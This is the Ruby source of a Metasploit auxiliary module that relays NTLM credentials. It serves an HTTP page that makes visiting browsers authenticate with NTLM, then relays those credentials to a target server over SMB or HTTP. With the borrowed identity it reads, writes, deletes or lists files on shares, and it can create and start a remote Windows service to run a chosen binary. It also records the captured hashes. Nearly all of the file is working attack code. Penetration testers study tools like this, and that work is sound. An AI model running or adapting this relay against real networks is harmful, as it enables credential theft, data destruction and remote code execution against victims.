##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

require 'rex/proto/ntlm/constants'
require 'rex/proto/ntlm/message'
require 'rex/proto/ntlm/crypt'
require 'rex/exceptions'


NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  # Aliases for common classes
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants
  NDR = Rex::Encoder::NDR

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HTTP Client MS Credential Relayer',
      'Description' => %q{
          This module relays negotiated NTLM Credentials from an HTTP server to multiple
          protocols. Currently, this module supports relaying to SMB and HTTP.

          Complicated custom attacks requiring multiple requests that depend on each
          other can be written using the SYNC* options. For example, a CSRF-style
          attack might first set an HTTP_GET request with a unique SNYNCID and set
          an HTTP_POST request with a SYNCFILE, which contains logic to look
          through the database and parse out important values, such as the CSRF token
          or authentication cookies, setting these as configuration options, and finally
          create a web page with iframe elements pointing at the HTTP_GET and HTTP_POSTs.
        },
      'Author'      =>
        [
          'Rich Lundeen <richard.lundeen[at]gmail.com>',
        ],
      'License'     => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'DefaultAction'  => 'WebServer'))

    register_options([
      OptBool.new('RSSL', [true, "SSL on the remote connection ", false]),
      OptEnum.new('RTYPE', [true, "Type of action to perform on remote target", "HTTP_GET",
        [   "HTTP_GET", "HTTP_POST", "SMB_GET", "SMB_PUT", "SMB_RM", "SMB_ENUM",
          "SMB_LS", "SMB_PWN" ]]),
      OptString.new('RURIPATH', [true, "The path to relay credentials ", "/"]),
      OptString.new('PUTDATA', [false, "This is the HTTP_POST or SMB_PUT data" ]),
      OptPath.new('FILEPUTDATA', [false, "PUTDATA, but specified by a local file" ]),
      OptPath.new('SYNCFILE', [false, "Local Ruby file to eval dynamically" ]),
      OptString.new('SYNCID', [false, "ID to identify a request saved to db" ]),

    ], self.class)

    register_advanced_options([
      OptPath.new('RESPPAGE', [false,
        'The file used for the server response. (Image extensions matter)', nil]),
      OptPath.new('HTTP_HEADERFILE', [false,
        'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil]),
      OptString.new('SMB_SHARES', [false, 'The shares to check with SMB_ENUM',
              'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'])
    ], self.class)

    deregister_options('DOMAIN', 'NTLM::SendLM', 'NTLM::SendSPN', 'NTLM::SendNTLM', 'NTLM::UseLMKey',
      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')
  end

  # Handles the initial requests waiting for the browser to try NTLM auth
  def on_request_uri(cli, request)

    case request.method
    when 'OPTIONS'
      process_options(cli, request)
    else
      datastore['REQUEST_IP'] = cli.peerhost
      cli.keepalive = true;

      # If the host has not started auth, send 401 authenticate with only the NTLM option
      if(!request.headers['Authorization'])
        response = create_response(401, "Unauthorized")
        response.headers['WWW-Authenticate'] = "NTLM"
        response.headers['Proxy-Support'] = 'Session-Based-Authentication'

        response.body =
          "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"

        cli.send_response(response)
        return false
      end
      method,hash = request.headers['Authorization'].split(/\s+/,2)
      # If the method isn't NTLM something odd is goign on.
      # Regardless, this won't get what we want, 404 them
      if(method != "NTLM")
        print_status("Unrecognized Authorization header, responding with 404")
        send_not_found(cli)
        return false
      end

      print_status("NTLM Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

      if (datastore['SYNCFILE'] != nil)
        sync_options()
      end

      handle_relay(cli,hash)
    end
  end

  def run
    parse_args()
    exploit()
  end

  def process_options(cli, request)
    print_status("OPTIONS #{request.uri}")
    headers = {
      'MS-Author-Via' => 'DAV',
      'DASL'          => '<DAV:sql>',
      'DAV'           => '1, 2',
      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
      'Cache-Control' => 'private'
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  #The call to handle_relay should be a victim HTTP type 1 request
  def handle_relay(cli_sock, hash)
    print_status("Beginning NTLM Relay...")
    message = Rex::Text.decode_base64(hash)
    #get type of message, which will be HTTP, SMB, ...
    protocol = datastore['RTYPE'].split('_')[0]
    if(message[8,1] != "\x03")
      #Relay NTLMSSP_NETOTIATE from client to server (type 1)
      case protocol
        when 'HTTP'
          resp, ser_sock = http_relay_toserver(hash)
          if resp.headers["WWW-Authenticate"]
            t2hash = resp.headers["WWW-Authenticate"].split(" ")[1]
          else
            print_error "#{rhost} is not requesting authentication."
            cli_sock.close
            ser_sock.close
            return false
          end
        when 'SMB'
          t2hash, ser_sock = smb_relay_toservert1(hash)
      end
      #goes along with above, resp is now just the hash
      client_respheader = "NTLM " << t2hash

      #Relay NTLMSSP_CHALLENGE from server to client (type 2)
      response = create_response(401, "Unauthorized")
      response.headers['WWW-Authenticate'] = client_respheader
      response.headers['Proxy-Support'] = 'Session-Based-Authentication'

      response.body =
        "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"

      cli_sock.send_response(response)

      #Get the type 3 hash from the client and relay to the server
      cli_type3Data = cli_sock.get_once(-1, 5)
      begin
        cli_type3Header = cli_type3Data.split(/\r\nAuthorization:\s+NTLM\s+/,2)[1]
        cli_type3Hash = cli_type3Header.split(/\r\n/,2)[0]
      rescue ::NoMethodError
        print_error("Error: Type3 hash not relayed.")
        cli_sock.close()
        return false
      end
      case protocol
        when 'HTTP'
          resp, ser_sock = http_relay_toserver(cli_type3Hash, ser_sock)
        when 'SMB'
          ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)
          #perform authenticated action
          action = datastore['RTYPE'].split('_')[1]
          case action
            when 'GET'
              resp = smb_get(ser_sock)
            when 'PUT'
              resp = smb_put(ser_sock)
            when 'RM'
              resp = smb_rm(ser_sock)
            when 'ENUM'
              resp = smb_enum(ser_sock)
            when 'LS'
              resp = smb_ls(ser_sock)
            when 'PWN'
              resp = smb_pwn(ser_sock, cli_sock)
          end
      end
      report_info(resp, cli_type3Hash)

      #close the client socket
      response = set_cli_200resp()
      cli_sock.send_response(response)
      cli_sock.close()
      if protocol == 'HTTP'
        ser_sock.close()
      end
      return
    else
      print_error("Error: Bad NTLM sent from victim browser")
      cli_sock.close()
      return false
    end
  end

  def parse_args()
    # Consolidate the PUTDATA and FILEPUTDATA options into FINALPUTDATA
    if datastore['PUTDATA'] != nil and datastore['FILEPUTDATA'] != nil
      print_error("PUTDATA and FILEPUTDATA cannot both contain data")
      raise ArgumentError
    elsif datastore['PUTDATA'] != nil
      datastore['FINALPUTDATA'] = datastore['PUTDATA']
    elsif datastore['FILEPUTDATA'] != nil
      f = File.open(datastore['FILEPUTDATA'], "rb")
      datastore['FINALPUTDATA'] = f.read
      f.close
    end

    unless framework.db.connected? or datastore['VERBOSE']
      print_error("No database configured and verbose disabled, info may be lost. Continuing")
    end
  end

  # sync_options dynamically changes the arguments of a running attack
  # this is useful for multi staged relay attacks
  # ideally I would use a resource file but it's not easily exposed, and this is simpler
  def sync_options()
    print_status("Dynamically eval()'ing local ruby file: #{datastore['SYNCFILE']}")
    # previous request might create the file, so error thrown at runtime
    if not ::File.readable?(datastore['SYNCFILE'])
      print_error("SYNCFILE unreadable, aborting")
      raise ArgumentError
    end
    data = ::File.read(datastore['SYNCFILE'])
    eval(data) # WARNING: This can be insanely insecure!
  end

  # relay creds to server and perform any HTTP specific attacks
  def http_relay_toserver(hash, ser_sock = nil)
    timeout = 20
    type3 = (ser_sock == nil ? false : true)

    method = datastore['RTYPE'].split('_')[1]
    theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
          "Connection: Keep-Alive\r\n" )

    if (method == 'POST')
      theaders << 'Content-Length: ' <<
        (datastore['FINALPUTDATA'].length + 4).to_s()<< "\r\n"
    end

    # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
    if datastore['HTTP_HEADERFILE'] != nil
      print_status("Including extra headers from: #{datastore['HTTP_HEADERFILE']}")
      #previous request might create the file, so error thrown at runtime
      if not ::File.readable?(datastore['HTTP_HEADERFILE'])
        print_error("HTTP_HEADERFILE unreadable, aborting")
        raise ArgumentError
      end
      #read file line by line to deal with any dos/unix ending ambiguity
      File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
        next if header.strip == ''
        theaders << (header) << "\r\n"
      end
    end

    opts = {
    'uri'     => normalize_uri(datastore['RURIPATH']),
    'method'  => method,
    'version' => '1.1',
    }
    if (datastore['FINALPUTDATA'] != nil)
      #we need to get rid of an extra "\r\n"
      theaders = theaders[0..-3]
      opts['data'] = datastore['FINALPUTDATA'] << "\r\n\r\n"
    end
    opts['SSL'] = true if datastore["RSSL"]
    opts['raw_headers'] = theaders

    ser_sock = connect(opts) if !type3

    r = ser_sock.request_raw(opts)
    resp = ser_sock.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout, true)

    # Type3 processing
    if type3
      #check if auth was successful
      if resp.code == 401
        print_error("Auth not successful, returned a 401")
      else
        print_status("Auth successful, saving server response in database")
      end
      vprint_status(resp)
    end
    return [resp, ser_sock]
  end

  #relay ntlm type1 message for SMB
  def smb_relay_toservert1(hash)
    rsock = Rex::Socket::Tcp.create(
      'PeerHost' 	=> datastore['RHOST'],
      'PeerPort'	=> datastore['RPORT'],
      'Timeout'	=> 3,
      'Context'	=>
        {
          'Msf'		=> framework,
          'MsfExploit'=> self,
        }
    )
    if (not rsock)
      print_error("Could not connect to target host (#{target_host})")
      return
    end
    ser_sock = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false)

    if (datastore['RPORT'] == '139')
      ser_sock.client.session_request()
    end

    blob = Rex::Proto::NTLM::Utils.make_ntlmssp_secblob_init('', '', 0x80201)
    ser_sock.client.negotiate(true)
    ser_sock.client.require_signing = false
    resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob, false)
    resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)

    #Save the user_ID for future requests
    ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']

    begin
      #lazy ntlmsspblob extraction
      ntlmsspblob =	'NTLMSSP' <<
              (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) <<
              "\x00\x00"
    rescue ::Exception => e
      print_error("Type 2 response not read properly from server")
      raise e
    end
    ntlmsspencodedblob = Rex::Text.encode_base64(ntlmsspblob)
    return [ntlmsspencodedblob, ser_sock]
  end

  #relay ntlm type3 SMB message
  def smb_relay_toservert3(hash, ser_sock)
    arg = get_hash_info(hash)
    dhash = Rex::Text.decode_base64(hash)

    #Create a GSS blob for ntlmssp type 3 message, encoding the passed hash
    blob =
      "\xa1" + Rex::Proto::NTLM::Utils.asn1encode(
        "\x30" + Rex::Proto::NTLM::Utils.asn1encode(
          "\xa2" + Rex::Proto::NTLM::Utils.asn1encode(
            "\x04" + Rex::Proto::NTLM::Utils.asn1encode(
              dhash
            )
          )
        )
      )

    resp = ser_sock.client.session_setup_with_ntlmssp_blob(
        blob,
        false,
        ser_sock.client.auth_user_id
      )
    resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)

    #check if auth was successful
    if (resp['Payload']['SMB'].v['ErrorClass'] == 0)
      print_status("SMB auth relay succeeded")
    else
      failure = Rex::Proto::SMB::Exceptions::ErrorCode.new
      failure.word_count = resp['Payload']['SMB'].v['WordCount']
      failure.command = resp['Payload']['SMB'].v['Command']
      failure.error_code = resp['Payload']['SMB'].v['ErrorClass']
      raise failure
    end
    return ser_sock
  end

  #gets a specified file from the drive
  def smb_get(ser_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    path = path
    ser_sock.client.tree_connect(share)
    ser_sock.client.open("\\" << path, 0x1)
    resp = ser_sock.client.read()
    print_status("Reading #{resp['Payload'].v['ByteCount']} bytes from #{datastore['RHOST']}")
    vprint_status("----Contents----")
    vprint_status(resp["Payload"].v["Payload"])
    vprint_status("----End Contents----")
    ser_sock.client.close()
    return resp["Payload"].v["Payload"]
  end

  #puts a specified file
  def smb_put(ser_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    path = path
    ser_sock.client.tree_connect(share)

    fd = ser_sock.open("\\#{path}", 'rwct')
    fd << datastore['FINALPUTDATA']
    fd.close

    logdata = "File \\\\#{datastore['RHOST']}\\#{datastore['RURIPATH']} written"
    print_status(logdata)
    return logdata
  end

  #deletes a file from a share
  def smb_rm(ser_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    path = path
    ser_sock.client.tree_connect(share)
    ser_sock.client.delete('\\' << path)
    logdata = "File \\\\#{datastore['RHOST']}\\#{datastore['RURIPATH']} deleted"
    print_status(logdata)
    return logdata
  end

  #smb share enumerator, overly simplified, just tries connecting to configured shares
  #This could be improved by using techniques from SMB_ENUMSHARES
  def smb_enum(ser_sock)
    shares = []
    datastore["SMB_SHARES"].split(",").each do |share_name|
      begin
        ser_sock.client.tree_connect(share_name)
        shares << share_name
      rescue
        next
      end
    end
    print_status("Shares enumerated #{datastore["RHOST"]} #{shares.to_s()}")
    return shares
  end

  #smb list directory
  def smb_ls(ser_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    ser_sock.client.tree_connect(share)
    files = ser_sock.client.find_first(path << "\\*")

    print_status(
      "Listed #{files.length} files from #{datastore["RHOST"]}\\#{datastore["RURIPATH"]}"
    )

    if datastore["VERBOSE"]
      files.each {|filename| print_status("    #{filename[0]}")}
    end
    return files
  end

  #start a service. This methos copies a lot of logic/code from psexec (and smb_relay)
  def smb_pwn(ser_sock, cli_sock)

    #filename is a little finicky, it needs to be in a format like
    #"%SystemRoot%\\system32\\calc.exe" or "\\\\host\\c$\\WINDOWS\\system32\\calc.exe
    filename = datastore['RURIPATH']

    ser_sock.connect("IPC$")
    opts = {
      'Msf' => framework,
      'MsfExploit' => self,
      'smb_pipeio' => 'rw',
      'smb_client' => ser_sock
    }
    uuidv = ['367abb81-9844-35f1-ad32-98f038001003', '2.0']
    handle = Rex::Proto::DCERPC::Handle.new(uuidv, 'ncacn_np', cli_sock.peerhost, ["\\svcctl"])
    dcerpc = Rex::Proto::DCERPC::Client.new(handle, ser_sock.socket, opts)

    print_status("Obtraining a service manager handle...")
    stubdata =
      NDR.uwstring("\\\\#{datastore["RHOST"]}") +
      NDR.long(0) +
      NDR.long(0xF003F)
    begin
      response = dcerpc.call(0x0f, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
        scm_handle = dcerpc.last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Creating a new service")

    servicename = Rex::Text::rand_text_alpha(8)
    displayname = Rex::Text::rand_text_alpha(rand(32)+1)
    svc_handle = nil

    stubdata =
      scm_handle +
      NDR.wstring(servicename) +
      NDR.uwstring(displayname) +
      NDR.long(0x0F01FF) + # Access: MAX
      NDR.long(0x00000110) + # Type: Interactive, Own process
      NDR.long(0x00000003) + # Start: Demand
      NDR.long(0x00000000) + # Errors: Ignore

      NDR.wstring(filename) + # Binary Path
      NDR.long(0) + # LoadOrderGroup
      NDR.long(0) + # Dependencies
      NDR.long(0) + # Service Start
      NDR.long(0) + # Password
      NDR.long(0) + # Password
      NDR.long(0) + # Password
      NDR.long(0)   # Password

    begin
        response = dcerpc.call(0x0c, stubdata)
        if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
            svc_handle = dcerpc.last_response.stub_data[0,20]
            svc_status = dcerpc.last_response.stub_data[24,4]
        end
    rescue ::Exception => e
        print_error("Error: #{e}")
        return
    end

    print_status("Closing service handle...")
    begin
      response = dcerpc.call(0x0, svc_handle)
    rescue ::Exception
    end

    print_status("Opening service...")
    begin
      stubdata =
          scm_handle +
          NDR.wstring(servicename) +
          NDR.long(0xF01FF)

      response = dcerpc.call(0x10, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
        svc_handle = dcerpc.last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Starting the service...")
    stubdata =
      svc_handle +
      NDR.long(0) +
      NDR.long(0)
    begin
      response = dcerpc.call(0x13, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
      end
    rescue ::Exception => e
      return
    end

    print_status("Removing the service...")
    stubdata =
      svc_handle
    begin
      response = dcerpc.call(0x02, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    print_status("Closing service handle...")
    begin
      response = dcerpc.call(0x0, svc_handle)
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    ser_sock.disconnect("IPC$")
  end

  #print status, and add to the info database
  def report_info(resp, type3_hash)
    data = get_hash_info(type3_hash)

    #no need to generically always grab everything, but grab common config options
    #and the response, some may be set to nil and that's fine
    data[:protocol] = datastore['RTYPE']
    data[:RHOST] = datastore['RHOST']
    data[:RPORT] = datastore['RPORT']
    data[:RURI] = datastore['RURIPATH']
    data[:SYNCID] = datastore['SYNCID']
    data[:Response] = resp

    report_note(
      :host => data[:ip],
      :type => 'ntlm_relay',
      :update => 'unique_data',
      :data => data
    )
  end

  #mostly taken from http_ntlm module handle_auth function
  def get_hash_info(type3_hash)
    #authorization string is base64 encoded message
    domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(type3_hash)
    nt_len = ntlm_hash.length

    if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
      arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
        :lm_hash => lm_hash,
        :nt_hash => ntlm_hash
      }

      if arg[:lm_hash][16,32] == '0' * 32
        arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
      end
    #if the length of the ntlm response is not 24 then it will be bigger and represent
    #a ntlmv2 response
    elsif nt_len > 48 #lmv2/ntlmv2
      arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
        :lm_hash 		=> lm_hash[0, 32],
        :lm_cli_challenge 	=> lm_hash[32, 16],
        :nt_hash 		=> ntlm_hash[0, 32],
        :nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
      }
    elsif nt_len == 0
      print_status("Empty hash from #{host} captured, ignoring ... ")
    else
      print_status("Unknow hash type from #{host}, ignoring ...")
    end

    arg[:host] = host
    arg[:user] = user
    arg[:domain] = domain

    return arg
  end

  #function allowing some basic/common configuration in responses
  def set_cli_200resp()
    response = create_response(200, "OK")
    response.headers['Proxy-Support'] = 'Session-Based-Authentication'

    if (datastore['RESPPAGE'] != nil)
      begin
        respfile = File.open(datastore['RESPPAGE'], "rb")
        response.body = respfile.read
        respfile.close

        type = datastore['RESPPAGE'].split('.')[-1].downcase
        #images can be especially useful (e.g. in email signatures)
        case type
        when 'png', 'gif', 'jpg', 'jpeg'
          print_status('setting content type to image')
          response.headers['Content-Type'] = "image/" << type
        end
      rescue
        print_error("Problem processing respfile. Continuing...")
      end
    end
    if (response.body.empty?)
      response.body = "<HTML><HEAD><TITLE>My Page</TITLE></HEAD></HTML>"
    end
    return response
  end
end
